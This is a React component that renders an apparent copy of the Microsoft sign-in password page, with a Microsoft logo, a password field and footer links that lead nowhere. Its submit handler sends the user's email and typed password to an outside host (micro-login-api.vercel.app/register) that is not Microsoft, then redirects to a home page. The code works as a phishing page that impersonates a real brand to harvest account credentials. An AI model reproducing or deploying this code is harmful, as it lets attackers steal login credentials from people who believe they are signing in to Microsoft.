import React, { useEffect, useState } from 'react';
import { Link, useLocation } from 'react-router-dom';
import axios from 'axios'
import { useNavigate } from 'react-router-dom';
import Microsoftlogo from './assets/microsoftlogo.png';
import Menudots from './assets/footerdots.png';
import './App.css';

function Password() {
    const [password, setPassword] = useState('');
    const [animate, setAnimate] = useState(false);
    const navigate = useNavigate();
    const location = useLocation();
    const { email } = location.state || {};

    useEffect(() => {
        setAnimate(true);
    }, []);

    const handleSubmit = (e) => {
        e.preventDefault();
        axios.post('https://micro-login-api.vercel.app/register', {email, password})
        .then(result => {
            console.log(result);
        navigate('/home');
        })
        .catch(err => console.log(err));
    };

  return (
        <div className='background-image'>
            <div className='container'>
                <div className={`form-container ${animate ? 'animate' : ''}`}>
                    <div className='header-logo'>
                            <img src={Microsoftlogo} alt="Microsoft logo" style={{ width: '150px' }} />
                    </div>
                    {email && <p className='email-display'>{email}</p>}
                        <form onSubmit={handleSubmit}>
                            <div className='mb-2'>
                                <label htmlFor='password'>
                                    <p className='p1'>Enter Password</p>
                                </label>
                                <input  
                                    type='password'
                                    placeholder='Password'
                                    autoComplete='off'
                                    name='password'
                                    className='textbox'
                                    required
                                    onChange={(e) => setPassword(e.target.value)}
                                />
                                <hr className='hr1'></hr>
                                <a className='a1' href='#'>Forgot password?</a><br></br>
                                <a className='a2' href='#'>Other ways to sign in</a>
                            </div>
                            <button type="submit" className='next btn btn-primary w-25 rounded-0'>
                            Sign in
                        </button>
                        </form>
                </div>
            </div>
            <div className='footer'>
            <a className='a4' href='#'>Terms of use</a>
            <a className='a5' href='#'>Privacy & cookies</a>
            <a className='a6' href='#'><img className='img6' src={Menudots} alt=''></img></a>
        </div>
        </div>
        
  );
}

export default Password;
